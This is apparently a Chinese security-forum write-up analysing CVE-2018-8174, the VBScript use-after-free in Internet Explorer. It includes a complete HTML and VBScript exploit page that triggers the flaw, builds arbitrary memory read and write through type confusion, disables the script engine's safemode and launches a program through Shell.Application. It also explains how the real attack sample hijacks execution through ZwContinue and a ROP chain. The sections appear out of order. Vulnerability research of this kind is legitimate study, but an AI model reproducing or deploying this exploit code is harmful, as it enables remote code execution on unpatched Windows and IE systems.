
```
//1、区别于上篇帖子中构造的CVE-2014-6332EXP：因为6332利用中是借助数组错位的内存空间特性、在漏洞代码执行之后通过可控的数组元素赋值实现类型混淆，而8174是通过构造特定的类对象在内存空间占位、并借助类对象成员在内存空间特定排序及可控的内存大小实现类型混淆。所以在获取COleScript对象地址时的处理明显不同（构造第二组Trigger进行混淆是为了在内存中占位一个１６字节的缓冲区（之前用于存放FAKELONGINT 字符串），这样可以避免后续存放CScriptEntryPoint对象等地址时的不可控的写入冲突，这也是该EXP中构造两组Trigger类的原因）。
//2、该EXP在IE10及以下版本可稳定触发，IE11无法触发。
//3、该EXP在执行完毕关闭IExeplore窗口之后会有一个提示为StackHash模块的崩溃窗口，网上相关帖子提到是因为浏览器DEP所致，笔者暂未能成功解决这个问题，希望各位大佬能帮忙指正！
<!doctype html>
<html lang="en">
<head>
<meta http-equiv="x-ua-compatible" content="IE=10">
<script language="vbscript">
dim array(40)
dim array\_a(6),array\_b(6)
dim garray
dim index
dim address
dim myconfa,myconfb
dim myclassA,myclassB
dim FAKESAFEARRAY
dim FAKELONGINT
FAKESAFEARRAY = unescape("%u0001%u0880%u0001%u0000%u0000%u0000%u0000%u0000%uffff%u7fff%u0000%u0000")
FAKELONGINT = Unescape("%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000")
class foo
end class
class confusionA
public default property get p
p = 174088534690791e-324
dim tempclass
for i=0 to 6
array\_a(i) = 0
next
set tempclass = new Class1
tempclass.mem = FAKESAFEARRAY
for i=0 to 6
set array\_a(i) = tempclass
next
end property
end class
class confusionB
public default property get p
p = 636598737289582e-328
dim tempclass
for i=0 to 6
array\_b(i) = 0
next
set tempclass = new Class1
tempclass.mem = FAKELONGINT
for i=0 to 6
set array\_b(i) = tempclass
next
end property
end class
class Class1
dim mem
function p0123456789
p0123456789 = LenB(mem(address+8))
end function
function p01
end function
end class
class Class2
dim mem
function p
end function
function setprop(value)
mem = value
setprop = 0
end function
end class
class TriggerA
private sub class\_Terminate()
set array\_a(index) = garray(1)
garray(1) = 1
index = index + 1
end sub
end class
class TriggerB
private sub class\_Terminate()
set array\_b(index) = garray(1)
garray(1) = 1
index = index + 1
end sub
end class
address = 0
set myconfa = new confusionA
set myconfb = new confusionB
sub uaf
Msgbox "uaf"
for i = 0 to 19
set array(i) = new foo
next
for i = 20 to 39
set array(i) = new Class2
next
index = 0
for i = 0 to 6
redim garray(1)
set garray(1) = new TriggerA
erase garray
next
set myclassA = new Class2
index = 0
for i = 0 to 6
redim garray(1)
set garray(1) = new TriggerB
erase garray
next
set myclassB = new Class2
end sub
sub initobjects
Msgbox "initobjects"
myclassA.setprop(myconfa)
myclassB.setprop(myconfb)
address = myclassB.mem
end sub
sub dummyfn()
end sub
function LeakFnAddr()//通过函数赋值时VBS“解析异常”的特性获取COleScript对象地址地址
On Error Resume Next
Dim tempaddr
tempaddr = dummyfn
tempaddr = null
myclassA.mem(address + 8) = tempaddr
myclassA.mem(address) = 3
LeakFnAddr = myclassA.mem(address + 8)
end function
Function ReadMemInt(Addr)
Dim value
myclassA.mem(address + 8) = Addr + 4
myclassA.mem(address) = 8
value = myclassA.p0123456789
myclassA.mem(address) = 2
ReadMemInt = value
End Function
function EnableGodMode()
Msgbox "EnableGodMode"
dim tempaddr
tempaddr = LeakFnAddr() //获取CScriptEntryPoint对象地址pObjCScriptEntryPoint
tempaddr = ReadMemInt(tempaddr+8) //poi(pObjCScriptEntryPoint+8)
tempaddr = ReadMemInt(tempaddr+16) //poi(poi(pObjCScriptEntryPoint+8)+16),即获取COleScript对象地址
dim temp(2) //未初始化的数组默认元素类型为0，数值为0
myclassA.mem(tempaddr+&h174) = temp(0) //覆盖safemode
end function
Sub runshell()
Msgbox "runshell"
Set shell = CreateObject("Shell.Application")
shell.ShellExecute "calc.exe"
End Sub
sub startExploit
uaf
initobjects
EnableGodMode
runshell
end sub
startExploit
</script>
</head>
<body>
CVE-2018-8174
</body>
</html>
```

### B、原始攻击样本中的利用

在获得内存任意地址读写之后、当前还需解决的一个问题是如何绕过相关的DEP保护。关于绕过保护机制我们得结合当前测试环境寻找办法，可以参考<a href="elink@765K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3u0D9L8$3N6K6i4K6u0W2x3K6j5H3i4K6u0W2j5$3&6Q4x3V1k6H3L8%4y4@1i4K6u0r3j5%4k6W2i4K6u0V1x3U0l9I4z5q4)9J5k6o6R3I4y4K6c8Q4x3X3g2Z5N6r3#2D9">构造思路</a>。

参照上述构造思路我花了较长时间去尝试还原利用，在一些细节问题上非常痛苦，既然如此就摊牌了不装B了，尴尬（毕竟厚积薄发、不服不行！）。

推荐一篇看雪论坛上的帖子，来自博主“来杯柠檬红茶”的[CVE-2018-8174 “双杀”0day 从UAF到Exploit](https://bbs.pediy.com/thread-248477.htm)，该帖子中较完整的还原了实际攻击中的构造思路，代码简洁、可读性较高、便于分析。该部分旨在去理解其构造思路。

该EXP构造流程如下：

![](upload/attach/201903/808521\_T9CRTFB2DN5NQZ7.jpg)

简要概括其流程如下：

１、触发漏洞，通过类型混淆构造可读写的自定义数组空间。

２、通过函数指针赋值时的特性获取`CSEntrypoint`对象地址，进而获取其虚表地址。

３、通过`vftable`获取PE文件`Vbscript.dll`的加载基址。

４、通过PE文件解析INT获取`msvcrt.dll`、`kernelbase.dll`、`ntdll.dll`模块基址，进而获取`Virtualprotect`、`NtContinue`函数地址。

５、精心构造一段ROP链，将其写入前面准备的可控数组空间。

６、借助特定代码时机攻击`NtContinue`函数劫持`eip`，获得shellcode执行。

上述流程虽然前面的具体实现较为繁琐，但是思路非常清晰。难点是最后两步，而且对于初次调试该EXP一直会有个疑问：当前构造的shellcode是在什么时机获得执行权限的？这也是该EXP分析的重点。

```
Sub ExecuteShellcode
'把类型改成0x4D
memClassA.mem(address) = &h4d
Msgbox "ExecuteShellcode"
memClassA.mem(address + 8) = 0
End Sub
```

上述脚本将给与Shellcode执行的机会。经前面分析可知`memClassA.mem(address)`指向的是我们初始定义的`Unescape("%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000")`的内存缓冲区，此时这段`VARIANT`的类型被修改为`4d`，在后续执行`memClassA.mem(address + 8) = 0`时，Vbs将检测该`VARIANT`结构并根据其类型进行相应的处理。在类型修改为`4d`之后，对该地址下访问断点即可跟踪到后续的处理逻辑。

![](upload/attach/201903/808521\_3DNZJ37BXSQAK3H.png)

如上所示，成功断到`AssignVar`函数，继续跟进，对其`vt`判断之后将进入到`VAR::Clear`。`Clear`函数内部将继续检测其类型然后做出相应释放处理，下面视图模式中绿色部分即是当前释放逻辑。

![](upload/attach/201903/808521\_UXQ46HBEQFQ6NH8.png)

跟踪上述流程，当变体类型满足`0x4c<vt<=0x50`时，代码流将按相应大小跳转到一个“函数指针数组”的结构。当类型为`0x4d`，将`VARIANT`中的值域压栈保存，并将该值域解析成`vfTable`，随后发生调用。

![](upload/attach/201903/808521\_UVBK2SX5TYMD85X.png)

发生调用的函数指针正是我们精心构造的ROP链中写入的`ntdll!ZwContinue`函数。

```
NTSYSAPI　NTSTATUS　NTAPI ZwContinue (
IN PCONTEXT Context;
IN BOOLEAN TestAlert
);
```

`ZwContinue`函数常用于Windows异常处理模块，在调用相应的异常处理回调函数时通过该函数恢复异常发生的环境信息进而进行处理。

这里主要理解两点：

１、当发生变体结构分配、修改时，对于特殊类型`0x4d`的处理流程（我们可以理解成该类型标识的是一个指向`vfTable`的用于安全释放处理的结构）。正是因为该特性，实现了虚表的攻击。

２、`ZwContinue`函数的功能。借助该函数通过传入伪造的`CONTEXT`参数，直接实现了`EIP`的劫持。

对于ROP链的构造是个得花费精力反复调试的过程，这里不做深入研究。

## 0x06　总结

该漏洞的分析断断续续地投入了较多时间，也遇到不少细节问题，不过一路死磕下来受益匪浅，在对于VBS虚拟机解释执行的机制、内存中的结构数据布局以及调试思路、方法等都有了新的认识。对于帖子中的疑问、错误、不足，欢迎各位同仁交流指点。

## 0x00 写在前面

CVE-2018-8174是2018年4月份由360团队在一起APT攻击中捕获的0day，实际攻击样本中该漏洞结合CVE-2017-0199（一个关于office ole相关的逻辑漏洞）实现远程代码访问执行，360将该漏洞命名为“双杀”漏洞。该漏洞存在于VBsCript引擎中，VbsCript在释放相关对象时对引用计数问题处理不善，当我们构造特定的对象引用即有可能借助该漏洞实现释放内存空间的访问，即UAF利用。漏洞影响范围覆盖当前绝大多数系统版本，详情参见官方公告。

此次调试环境我们选用win7 SP1+IE10，相关poc源码来源[CVE-2018-8174：从UAF到任意地址读写](https://bbs.kanxue.com/elink@d02K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2X3M7X3g2W2j5Y4g2X3i4K6u0W2j5$3!0E0i4K6u0r3N6Y4g2D9M7#2)9J5c8U0p5%4x3U0V1^5x3#2)9J5k6h3S2@1L8h3H3`.) 。作为漏洞研究新手，笔者参阅了各大论团上绝大多数关于该漏洞详细的分析报告，对卡巴斯基 Boris Larin写的一篇名为“Delving deep into VBScript Analysis of CVE-2018-8174 exploitation”的帖子([链接](https://bbs.kanxue.com/elink@ba0K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6k6h3y4#2M7X3g2D9K9i4y4@1i4K6u0W2j5$3!0E0i4K6u0r3k6r3g2D9N6X3W2F1k6#2)9J5k6r3c8W2k6i4m8Q4x3X3c8A6L8Y4c8G2i4K6u0V1N6X3u0K6j5%4u0A6M7s2c8Q4x3X3c8S2L8X3q4D9P5i4y4A6M7#2)9J5k6r3!0X3i4K6u0V1j5%4k6W2i4K6u0V1x3U0l9I4z5q4)9J5k6o6R3I4y4K6c8Q4x3X3c8W2P5s2m8D9L8$3W2@1j5i4c8A6L8$3&6Q4x3V1j5^5y4U0x3K6x3#2)9J5c8R3`.`.))尤为感兴趣，该帖子着重于深入讲解该漏洞的利用技巧并且对VBS虚拟机脚本解释机制进行了一定程度的刺探。所以本篇帖子中，我将尽可能地去还原Boris Larin报告中分享的内容。

身为漏洞学习者，分析之前明确分析目的：

1、uaf漏洞本身的成因

2、CVE-2018-8174漏洞的成因

3、猜测并验证vbs引擎如何去修复该漏洞

4、简单探测vbs虚拟机机制、更深层次的去理解vbs对象，学习更细粒度的调试技巧，学习总结该漏洞Exp构造方法。

5、学习针对vbs引擎的windbg插件扩展

6、尝试还原完整利用。

## 0x01 漏洞分析

### 关于UAF

UAF，即Use-After-Free，释放后使用。UAF漏洞是一种内存破坏漏洞，简单的说，漏洞的原因是使用了悬垂指针。对于UAF漏洞调试新手可以参考一下以下ｃ代码弄懂uaf原理以及最简单的利用模型。
